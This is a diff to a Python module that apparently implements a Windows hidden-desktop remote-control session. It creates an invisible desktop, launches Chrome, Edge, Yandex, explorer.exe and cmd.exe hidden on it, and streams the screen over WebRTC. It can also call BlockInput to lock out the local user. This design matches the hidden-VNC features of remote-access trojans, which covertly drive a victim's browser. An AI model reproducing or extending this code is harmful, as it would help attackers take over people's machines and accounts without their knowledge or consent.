@@ -68,6 +68,8 @@ if platform.system() == "Windows":
     BI_RGB = 0
     HORZRES = 8
     VERTRES = 10
+    SM_CXSCREEN = 0
+    SM_CYSCREEN = 1
 
     class BITMAPINFOHEADER(ctypes.Structure):
         _fields_ = [
@@ -115,6 +117,8 @@ if platform.system() == "Windows":
     user32.CloseDesktop.restype = wintypes.BOOL
     user32.SetThreadDesktop.argtypes = [wintypes.HANDLE]
     user32.SetThreadDesktop.restype = wintypes.BOOL
+    user32.GetThreadDesktop.argtypes = [wintypes.DWORD]
+    user32.GetThreadDesktop.restype = wintypes.HANDLE
     user32.BlockInput.argtypes = [wintypes.BOOL]
     user32.BlockInput.restype = wintypes.BOOL
     user32.GetDesktopWindow.argtypes = []
@@ -123,8 +127,12 @@ if platform.system() == "Windows":
     user32.GetWindowRect.restype = wintypes.BOOL
     user32.GetWindowDC.argtypes = [wintypes.HWND]
     user32.GetWindowDC.restype = wintypes.HDC
+    user32.GetDC.argtypes = [wintypes.HWND]
+    user32.GetDC.restype = wintypes.HDC
     user32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
     user32.ReleaseDC.restype = wintypes.INT
+    user32.GetSystemMetrics.argtypes = [wintypes.INT]
+    user32.GetSystemMetrics.restype = wintypes.INT
 
     gdi32.CreateCompatibleDC.argtypes = [wintypes.HDC]
     gdi32.CreateCompatibleDC.restype = wintypes.HDC
@@ -169,30 +177,6 @@ if platform.system() == "Windows":
     gdi32.GetDIBits.restype = wintypes.INT
 
 
-def _get_browser_hidden_args(app_name: str) -> list[str]:
-    """Return browser-specific arguments for hidden/headless launch."""
-    name = app_name.strip().lower() if app_name else ""
-    chromium_based = {
-        "chrome", "google chrome",
-        "brave", "brave browser",
-        "edge", "microsoft edge",
-        "opera",
-    }
-    if name in chromium_based:
-        return [
-            "--disable-backgrounding-occluded-windows",
-            "--disable-renderer-backgrounding",
-            "--disable-background-timer-throttling",
-            "--no-first-run",
-            "--no-default-browser-check",
-        ]
-    if name in {"firefox", "mozilla firefox"}:
-        return [
-            "-no-remote",
-        ]
-    return []
-
-
 def _resolve_app_executable(app_name: str) -> str | None:
     if not app_name:
         return None
@@ -231,6 +215,13 @@ def _resolve_app_executable(app_name: str) -> str | None:
             os.path.join(os.getenv("PROGRAMFILES", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
             os.path.join(os.getenv("PROGRAMFILES(X86)", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
             os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
+        ]
+    elif name in {"yandex", "yandex browser"}:
+        candidates = [
+            "browser.exe",
+            os.path.join(os.getenv("LOCALAPPDATA", ""), "Yandex", "YandexBrowser", "Application", "browser.exe"),
+            os.path.join(os.getenv("PROGRAMFILES", ""), "Yandex", "YandexBrowser", "Application", "browser.exe"),
+            os.path.join(os.getenv("PROGRAMFILES(X86)", ""), "Yandex", "YandexBrowser", "Application", "browser.exe"),
         ]
     else:
         candidates = [app_name]
@@ -287,15 +278,39 @@ def _toggle_block_input(enabled: bool) -> bool:
         return False
 
 
-def _open_hidden_desktop_dc(desktop_path: str | None):
-    if not desktop_path:
+def _get_screen_size() -> tuple[int, int]:
+    """Get screen size using GetSystemMetrics (works for current thread's desktop)."""
+    width = user32.GetSystemMetrics(SM_CXSCREEN)
+    height = user32.GetSystemMetrics(SM_CYSCREEN)
+    return width, height
+
+
+def _create_screen_dc():
+    """Create a DC for the entire screen of current thread's desktop using GetDC(NULL)."""
+    hdc = user32.GetDC(None)
+    if not hdc:
         return None, 0, 0, None
+    
+    width, height = _get_screen_size()
+    if width <= 0 or height <= 0:
+        width = gdi32.GetDeviceCaps(hdc, HORZRES)
+        height = gdi32.GetDeviceCaps(hdc, VERTRES)
+
+    def _cleanup() -> None:
+        try:
+            user32.ReleaseDC(None, hdc)
+        except Exception:
+            pass
+
+    return hdc, width, height, _cleanup
+
+
+def _create_display_dc():
+    """Create a DC for the display using CreateDCW."""
     create_dc = getattr(gdi32, "CreateDCW", None)
     if create_dc is None:
         return None, 0, 0, None
-    hdc = create_dc(desktop_path, None, None, None)
-    if not hdc:
-        hdc = create_dc("DISPLAY", desktop_path, None, None)
+    hdc = create_dc("DISPLAY", None, None, None)
     if not hdc:
         return None, 0, 0, None
     width = int(gdi32.GetDeviceCaps(hdc, HORZRES))
@@ -305,12 +320,19 @@ def _open_hidden_desktop_dc(desktop_path: str | None):
         try:
             gdi32.DeleteDC(hdc)
         except Exception:
-            return
+            pass
 
     return hdc, width, height, _cleanup
 
 
 class HiddenDesktopCapture:
+    """Capture screen using mss from the PRIMARY display.
+    
+    Hidden desktops in Windows don't have a graphical buffer - they are 
+    isolated process spaces but not for rendering. So we capture from 
+    the main screen while input goes to the hidden desktop.
+    """
+    
     def __init__(
         self,
         desktop_handle,
@@ -327,6 +349,8 @@ class HiddenDesktopCapture:
         self._frame_lock = threading.Lock()
         self._frame: bytes | None = None
         self._frame_size = (0, 0)
+        self._sct = None
+        self._monitor = None
         self._thread = threading.Thread(target=self._run, daemon=True)
         self._thread.start()
 
@@ -354,87 +378,58 @@ class HiddenDesktopCapture:
         self._stop_event.set()
         if self._thread.is_alive():
             self._thread.join(timeout=1.5)
+        if self._sct:
+            try:
+                self._sct.close()
+            except Exception:
+                pass
+            self._sct = None
 
-    def _capture(
-        self,
-        srcdc,
-        memdc,
-        bmp,
-        width: int,
-        height: int,
-        buffer,
-        bmi,
-    ) -> bytes | None:
-        if not gdi32.BitBlt(memdc, 0, 0, width, height, srcdc, 0, 0, SRCCOPY):
+    def _init_mss(self) -> bool:
+        """Initialize mss for screen capture from primary display."""
+        try:
+            import mss
+            self._sct = mss.mss()
+            monitors = self._sct.monitors
+            if not monitors:
+                logger.warning("Hidden desktop: no monitors found")
+                return False
+            # Use primary monitor (index 1) or full virtual screen (index 0)
+            index = 1 if len(monitors) > 1 else 0
+            self._monitor = monitors[index]
+            self._frame_size = (
+                int(self._monitor["width"]),
+                int(self._monitor["height"]),
+            )
+            logger.info("Hidden desktop: mss initialized, monitor=%s, size=%dx%d", 
+                        index, self._frame_size[0], self._frame_size[1])
+            return True
+        except Exception as exc:
+            logger.warning("Hidden desktop: mss init failed: %s", exc)
+            return False
+
+    def _capture_mss(self) -> bytes | None:
+        """Capture frame using mss."""
+        if not self._sct or not self._monitor:
             return None
-        lines = gdi32.GetDIBits(memdc, bmp, 0, height, buffer, ctypes.byref(bmi), DIB_RGB_COLORS)
-        if lines == 0:
+        try:
+            shot = self._sct.grab(self._monitor)
+            # mss returns BGRA format
+            return shot.raw
+        except Exception as exc:
+            logger.debug("Hidden desktop: mss grab failed: %s", exc)
             return None
-        return buffer.raw
 
     def _run(self) -> None:
-        if not _set_thread_desktop(self._desktop_handle):
+        # Initialize mss for capturing from primary display
+        if not self._init_mss():
+            logger.error("Hidden desktop: failed to initialize screen capture")
             return
-        hwindc = None
-        width = 0
-        height = 0
-        release_dc = None
-
-        hwindc, width, height, release_dc = _open_hidden_desktop_dc(self._desktop_path)
-        if hwindc:
-            logger.info("Hidden desktop: capture DC opened via CreateDC.")
-        else:
-            hwnd = user32.GetDesktopWindow()
-            rect = RECT()
-            if not user32.GetWindowRect(hwnd, ctypes.byref(rect)):
-                logger.warning("Hidden desktop: failed to get desktop rect.")
-                return
-            width = max(1, rect.right - rect.left)
-            height = max(1, rect.bottom - rect.top)
-            hwindc = user32.GetWindowDC(hwnd)
-            if not hwindc:
-                logger.warning("Hidden desktop: failed to get window DC.")
-                return
-
-            def _release() -> None:
-                try:
-                    user32.ReleaseDC(hwnd, hwindc)
-                except Exception:
-                    return
-
-            release_dc = _release
-
-        if width <= 0 or height <= 0:
-            logger.warning("Hidden desktop: invalid capture size (%s x %s).", width, height)
-            if release_dc:
-                release_dc()
-            return
-
-        self._frame_size = (width, height)
-        memdc = gdi32.CreateCompatibleDC(hwindc)
-        bmp = gdi32.CreateCompatibleBitmap(hwindc, width, height)
-        if not memdc or not bmp:
-            logger.warning("Hidden desktop: failed to create capture DC/bitmap.")
-            if memdc:
-                gdi32.DeleteDC(memdc)
-            if release_dc:
-                release_dc()
-            return
-        old = gdi32.SelectObject(memdc, bmp)
-
-        bmi = BITMAPINFO()
-        bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
-        bmi.bmiHeader.biWidth = width
-        bmi.bmiHeader.biHeight = -height
-        bmi.bmiHeader.biPlanes = 1
-        bmi.bmiHeader.biBitCount = 32
-        bmi.bmiHeader.biCompression = BI_RGB
-        buffer = ctypes.create_string_buffer(width * height * 4)
 
         try:
             while not self._stop_event.is_set():
                 start = time.monotonic()
-                data = self._capture(hwindc, memdc, bmp, width, height, buffer, bmi)
+                data = self._capture_mss()
                 if data:
                     with self._frame_lock:
                         self._frame = data
@@ -445,11 +440,12 @@ class HiddenDesktopCapture:
                 if sleep_for:
                     self._stop_event.wait(sleep_for)
         finally:
-            gdi32.SelectObject(memdc, old)
-            gdi32.DeleteObject(bmp)
-            gdi32.DeleteDC(memdc)
-            if release_dc:
-                release_dc()
+            if self._sct:
+                try:
+                    self._sct.close()
+                except Exception:
+                    pass
+                self._sct = None
 
 
 class HiddenDesktopTrack(MediaStreamTrack):
@@ -676,11 +672,14 @@ class HiddenDesktopSession:
         startupinfo.lpDesktop = self._desktop_path
         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
         startupinfo.wShowWindow = subprocess.SW_HIDE
-        try:
-            proc = subprocess.Popen(["cmd.exe"], startupinfo=startupinfo)
-            self._processes.append(proc)
-        except Exception as exc:
-            logger.warning("Failed to start cmd.exe on hidden desktop: %s", exc)
+        for cmd in ("explorer.exe", "cmd.exe"):
+            try:
+                proc = subprocess.Popen([cmd], startupinfo=startupinfo)
+                self._processes.append(proc)
+            except Exception as exc:
+                logger.warning("Failed to start %s on hidden desktop: %s", cmd, exc)
+        # Give explorer.exe time to initialize the desktop shell
+        time.sleep(0.5)
 
     def launch_application(self, app_name: str) -> None:
         exe = _resolve_app_executable(app_name)
@@ -690,14 +689,7 @@ class HiddenDesktopSession:
         startupinfo.lpDesktop = self._desktop_path
         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
         startupinfo.wShowWindow = subprocess.SW_HIDE
-
-        cmd = [exe] + _get_browser_hidden_args(app_name)
-        creationflags = subprocess.CREATE_NO_WINDOW
-        proc = subprocess.Popen(
-            cmd,
-            startupinfo=startupinfo,
-            creationflags=creationflags,
-        )
+        proc = subprocess.Popen([exe], startupinfo=startupinfo)
         self._processes.append(proc)
 
     def block_local_input(self) -> bool:
